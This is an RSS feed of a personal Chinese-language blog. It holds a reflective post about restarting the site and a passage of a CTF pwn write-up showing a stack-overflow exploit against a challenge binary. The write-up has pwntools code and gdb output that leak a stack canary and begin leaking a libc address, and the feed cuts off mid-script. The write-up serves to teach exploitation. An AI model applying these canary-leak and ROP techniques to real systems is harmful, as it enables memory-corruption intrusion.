<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>灯盐的缝纫工厂</title><link>https://nepl1t.github.io/</link><description>Recent content on 灯盐的缝纫工厂</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 21 Jul 2024 01:09:28 +0800</lastBuildDate><atom:link href="https://nepl1t.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>First</title><link>https://nepl1t.github.io/p/first/</link><pubDate>Fri, 27 Oct 2023 08:27:04 +0800</pubDate><guid>https://nepl1t.github.io/p/first/</guid><description>&lt;img src="https://s2.loli.net/2023/11/16/5pNg9fCPYueikoW.png" alt="Featured image of post First" />&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">建站日期 / Establishment date： June 13th, 2023
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">复站日期 / Restoring date: October 27th, 2023
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="为什么重新开始">为什么重新开始
&lt;/h2>&lt;p>想说却没说成的话太多了。&lt;/p>
&lt;p>当时建站的目的，是希望能给自己创造一个 Sharing my honest opinion 的空间，但是我的完美主义却始终在阻碍着我的写作。况且我从前很多时候，都很难做到正视自己的情绪，并与之共处。而最后没能说出口的，最终都成为了模糊的梦呓，像是坐在从乌云层俯冲降落的客机，只能在心里回味失重的感觉，却没有办法看到舱外实在的风景。&lt;/p>
&lt;p>而这样的遗忘正在分割我自己。自我像是一面被打碎的镜子，分散在过去的切片里。而了解自己究竟是什么样的人，也一度成为了了困扰我最大的问题。因为这样的忘却就像是拼图中缺失的几块，始终凑不出图画的真迹。在这时候，我又会按照我后来的心境，重新解释我当时的想法。用篡改过的真相当作麻药，企图让自己回避问题的疼痛。&lt;/p>
&lt;p>所以我重新建站是为了什么呢？我想，应该是抵抗这样的遗忘：前几天翻到自己的中学日记，我惊诧于在自己反复重复的历史中表现的惊人的相似，原来自己真的是不长记性，错过一次还能再错，一错再错……以至于我能把自己情绪周期、情感心路发展全部刻画成一套模式。遗忘会让我忘记先前的错误，让我在历史的教训中吸取不到任何的教训。离开母体后的日子里我做过无数次自我剖析，然而它们最后都成了工具，满足我鞭笞自己的欲望罢了，没有对自我成长起到太大正面的作用。&lt;/p>
&lt;p>我讨厌作为交流的文字，但我喜欢作为记录的文字。我希望能用文字作为记录我所思所想的载体，让我在以后能够最大限度地体会在每个阶段里我的所思所想。人格、感情、观点都是流动的，而记录却不会改变。唐太宗曾说“以史为鉴可以知兴替”，他口中的兴替是国家的盛衰之因。我没有那种大国情怀，对我来说回顾往事，更多是希望能够为以后的疑惑给出解决思路。&lt;/p>
&lt;p>还有一个原因是：我需要一个单向的树洞，满足自己的倾诉欲。有段时间我找了很多我根本不熟的人，向他们倾诉了许多我不会给我身边人诉说的我心中恶心而危险的东西，结交了许多了解我很多秘密的陌生人。我现在觉得，干脆把它们写出来算了。个人网站可以很好的满足这一需求。况且搭建的过程也很让我有成就感：当你感觉到自己真的有在做一件有意义的事情，这样的满足、愉悦是无以复加的。&lt;/p>
&lt;p>最后，请允许我介绍一下自己：这里是 dyan，这里是 nepl1t，大学生。利他出于利己，时刻以满足自己的自恋倾向作为最高需求。&lt;/p></description></item><item><title>Pwn01 ROP and FSB</title><link>https://nepl1t.github.io/p/pwn01-rop-and-fsb/</link><pubDate>Sun, 21 Jul 2024 01:09:28 +0800</pubDate><guid>https://nepl1t.github.io/p/pwn01-rop-and-fsb/</guid><description>&lt;blockquote>
&lt;p>&lt;strong>Attention!&lt;/strong>&lt;/p>
&lt;p>该界面内提到的任何代码与原程序都可在 &lt;a class="link" href="https://github.com/nepl1t/nepl1t.github.io/tree/master/assets" target="_blank" rel="noopener"
>https://github.com/nepl1t/nepl1t.github.io/tree/master/assets&lt;/a> 内找到&lt;/p>
&lt;/blockquote>
&lt;h2 id="task1-ropbasic">Task1 ropbasic
&lt;/h2>&lt;h3 id="preparation">Preparation
&lt;/h3>&lt;p>首先 &lt;code>checksec&lt;/code> 一下程序，保护全开。 ROPgadget 只能找到一个 gadget：&lt;/p>
&lt;pre>&lt;font color="#5FD700">❯&lt;/font> &lt;font color="#26A269">ROPgadget&lt;/font> --binary &lt;u style="text-decoration-style:solid">./ropbasic&lt;/u> --only &lt;font color="#A2734C">&amp;quot;pop|ret&amp;quot;&lt;/font>
Gadgets information
============================================================
0x00000000000011d3 : pop rbp ; ret
0x000000000000101a : ret
Unique gadgets found: 2
&lt;/pre>
&lt;p>嗯，至少找到一个 rbp_ret_addr 是 &lt;code>0x00000000000011d3 &lt;/code>了。&lt;/p>
&lt;p>反编译一下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__fastcall&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">envp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+Ch] [rbp-114h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">264&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+10h] [rbp-110h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v6&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+118h] [rbp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">__readfsqword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x28u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">initbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">envp&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100uLL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;input&amp;gt; &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1000uLL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>main()&lt;/code> 的逻辑十分简单，每次将 &lt;code>s&lt;/code> 开始的连续 &lt;code>0x100&lt;/code> 个内存清零，然后输出，&lt;code>read()&lt;/code> 0x1000个字节。肯定有栈溢出。&lt;/p>
&lt;p>&lt;code>s&lt;/code> 相对 rbp 的偏移地址为 &lt;code>0x110&lt;/code>，考虑到程序开了 Canary，因此当务之急就是将其泄漏出来，否则栈溢出泄漏 libc 就无从说起。&lt;/p>
&lt;h3 id="leaking-canary">Leaking Canary
&lt;/h3>&lt;p>根据代码知道，使用 gdb 停到 call memset 时：&lt;/p>
&lt;pre>
0x555555555264 &lt;font color="#AFD700">lea&lt;/font>&lt;font color="#FFFFFF"> &lt;/font>&lt;font color="#5FD7FF">rax&lt;/font>&lt;font color="#FFFFFF">, [&lt;/font>&lt;font color="#5FD7FF">rbp&lt;/font>&lt;font color="#FFFFFF"> - &lt;/font>&lt;font color="#AF87FF">0x110&lt;/font>&lt;font color="#FFFFFF">]&lt;/font> &lt;font color="#C01C28">&lt;b>RAX&lt;/b>&lt;/font> =&amp;gt; &lt;font color="#A2734C">0x7fffffffd9f0&lt;/font> ◂— 0
0x55555555526b &lt;font color="#AFD700">mov&lt;/font>&lt;font color="#FFFFFF"> &lt;/font>&lt;font color="#5FD7FF">edx&lt;/font>&lt;font color="#FFFFFF">, &lt;/font>&lt;font color="#AF87FF">0x100&lt;/font> &lt;font color="#C01C28">&lt;b>EDX&lt;/b>&lt;/font> =&amp;gt; 0x100
0x555555555270 &lt;font color="#AFD700">mov&lt;/font>&lt;font color="#FFFFFF"> &lt;/font>&lt;font color="#5FD7FF">esi&lt;/font>&lt;font color="#FFFFFF">, &lt;/font>&lt;font color="#AF87FF">0&lt;/font> &lt;b>ESI&lt;/b> =&amp;gt; 0
0x555555555275 &lt;font color="#AFD700">mov&lt;/font>&lt;font color="#FFFFFF"> &lt;/font>&lt;font color="#5FD7FF">rdi&lt;/font>&lt;font color="#FFFFFF">, &lt;/font>&lt;font color="#5FD7FF">rax&lt;/font> &lt;font color="#C01C28">&lt;b>RDI&lt;/b>&lt;/font> =&amp;gt; &lt;font color="#A2734C">0x7fffffffd9f0&lt;/font> ◂— 0
►&lt;font color="#26A269">&lt;b>0x555555555278&lt;/b>&lt;/font> &lt;font color="#AFD700">&lt;b>call&lt;/b>&lt;/font>&lt;font color="#FFFFFF"> &lt;/font>&lt;font color="#C01C28">memset@plt&lt;/font> &amp;lt;&lt;font color="#C01C28">memset@plt&lt;/font>&amp;gt;
&lt;b>s&lt;/b>: &lt;font color="#A2734C">0x7fffffffd9f0&lt;/font> ◂— 0
&lt;b>c&lt;/b>: 0
&lt;b>n&lt;/b>: 0x100
&lt;/pre>
&lt;p>然后查询 rdi 与 rsp 的值：&lt;/p>
&lt;pre>&lt;font color="#C01C28">*&lt;/font>&lt;font color="#C01C28">&lt;b>RDI &lt;/b>&lt;/font> &lt;font color="#A2734C">0x7fffffffd9f0&lt;/font> ◂— 0
&lt;b>RSP &lt;/b> &lt;font color="#A2734C">0x7fffffffd9e0&lt;/font> ◂— 0
&lt;/pre>
&lt;p>那么， 从 rdi （0x7fffffffd9f0）开始依次读取内存数据到 rsp （0x7fffffffdb00）的位置：&lt;/p>
&lt;pre>&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>x /40gx 0x7fffffffd9f0
&lt;font color="#12488B">0x7fffffffd9f0&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda00&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda10&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda20&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda30&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda40&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda50&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda60&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda70&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda80&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffda90&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdaa0&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdab0&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdac0&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdad0&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdae0&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdaf0&lt;/font>: 0x0000000000000000 0xe719bae42bbeac00
&lt;font color="#12488B">0x7fffffffdb00&lt;/font>: 0x0000000000000001 0x00007ffff7c29d90
&lt;font color="#12488B">0x7fffffffdb10&lt;/font>: 0x0000000000000000 0x0000555555555230
&lt;font color="#12488B">0x7fffffffdb20&lt;/font>: 0x0000000100000000 0x00007fffffffdc18
&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>&lt;/pre>
&lt;p>考虑到 &lt;code>memset()&lt;/code> 函数在这里只清空了 0x100 的数据 （一直到 &lt;code>0x7fffffffdaf0: 0x0000000000000000&lt;/code> ） ，而 &lt;code>0x7fffffffdaf8: 0xe719bae42bbeac00&lt;/code> ，这是一个 0x00 作结尾的数据，可以推测这就是 Canary，关于 &lt;code>s&lt;/code> 的偏移值为 0x108。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#0x7 bytes: b&amp;#39;input&amp;gt; &amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x108&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;B&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x108&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Canary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x42&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x9&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Canary:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Canary&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行效果如下：&lt;/p>
&lt;pre>[&lt;font color="#C01C28">&lt;b>DEBUG&lt;/b>&lt;/font>] Received 0x7 bytes:
b&amp;apos;input&amp;gt; &amp;apos;
[&lt;font color="#C01C28">&lt;b>DEBUG&lt;/b>&lt;/font>] Sent 0x109 bytes:
b&amp;apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB&amp;apos;
[&lt;font color="#C01C28">&lt;b>DEBUG&lt;/b>&lt;/font>] Received 0x119 bytes:
00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA&lt;font color="#12488B">│&lt;/font>AAAA&lt;font color="#12488B">│&lt;/font>AAAA&lt;font color="#12488B">│&lt;/font>AAAA│
*
00000100 41 41 41 41 41 41 41 41 42 &lt;font color="#12488B">9f&lt;/font> 7e 4b &lt;font color="#12488B">15&lt;/font> &lt;font color="#12488B">b6&lt;/font> 3e &lt;font color="#12488B">f9&lt;/font> │AAAA&lt;font color="#12488B">│&lt;/font>AAAA&lt;font color="#12488B">│&lt;/font>B&lt;font color="#12488B">·&lt;/font>~K&lt;font color="#12488B">│··&lt;/font>&amp;gt;&lt;font color="#12488B">·&lt;/font>│
00000110 &lt;font color="#12488B">01&lt;/font> &lt;font color="#C01C28">0a&lt;/font> 69 6e 70 75 74 3e 20 │&lt;font color="#12488B">·&lt;/font>&lt;font color="#C01C28">·&lt;/font>in&lt;font color="#12488B">│&lt;/font>put&amp;gt;&lt;font color="#12488B">│&lt;/font> │
00000119
[&lt;font color="#12488B">&lt;b>*&lt;/b>&lt;/font>] Canary:0xf93eb6154b7e9f00
&lt;/pre>
&lt;p>得到 Canary 为 &lt;code>0xf93eb6154b7e9f00&lt;/code>&lt;/p>
&lt;p>程序没有检测到栈溢出，而是正常退出，这说明 Canary 成功泄漏并绕过了。&lt;/p>
&lt;h3 id="leaking-libc-addr">Leaking libc addr
&lt;/h3>&lt;p>由于开了 PIE，每次运行的基址都不一样，所以每次栈溢出 ROP 之前，都需要得到 libc 的地址。通过 &lt;code>objdump -d&lt;/code> 可以发现程序里确实是有 &lt;code>libc_start_main()&lt;/code> 的符号，我们可以找到它的地址，再减去其在 libc 中的偏移地址，从而得到 libc 地址。&lt;/p>
&lt;p>首先，动态调试时（此时正在 &lt;code>read()&lt;/code> 函数内）看到如下信息：&lt;/p>
&lt;pre>&lt;font color="#12488B">─────────────────────────[ BACKTRACE ]──────────────────────────&lt;/font>
► 0 0x55555555526b
1 0x7ffff7c29d90
2 0x7ffff7c29e40 __libc_start_main+128
3 0x555555555125
&lt;/pre>
&lt;p>因此可以判定， &lt;code>0x55555555526b&lt;/code> （作为 &lt;code>read()&lt;/code> 函数的返回地址）位于 &lt;code>main()&lt;/code> 内，因此 &lt;code>0x7ffff7c29d90&lt;/code> 就是 &lt;code>main()&lt;/code> 函数执行完后的返回地址。&lt;/p>
&lt;p>注意到 &lt;code>0x7ffff7c29e40&lt;/code> （ 相对 &lt;code>0x7ffff7c29d90&lt;/code> 是 &lt;code>0xb0&lt;/code>）相对于 &lt;code>__libc_start_main()&lt;/code> 的偏移值是 &lt;code>0x80&lt;/code> (128) ，因此可以得到 &lt;code>main()&lt;/code> 的返回地址相对于 &lt;code>__libc_start_main()&lt;/code> 的偏移值是 &lt;code>0x30&lt;/code> 。通过前面栈溢出得到 &lt;code>main()&lt;/code> 的返回地址后，我们就可以得到&lt;code>__libc_start_main()&lt;/code> 的实际地址。&lt;/p>
&lt;p>通过如下的 python 脚本，可以得到 libc 的地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Leaking libc address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__libc_start_main_offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__libc_start_main&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># pause()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;AABBCCDDEEFFGGHH&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#0x108 + 0x8 + 0x8 = 0x118&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x118&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">received&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvline&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">#后面一个 &amp;#39;\ninput&amp;gt; &amp;#39; (printf的内容)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">received&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">received&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">received&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">received&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">received&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># pause()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">main_return_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">received&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;waitwhat? &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">main_return_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__libc_start_main_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">main_return_addr&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x30&lt;/span>
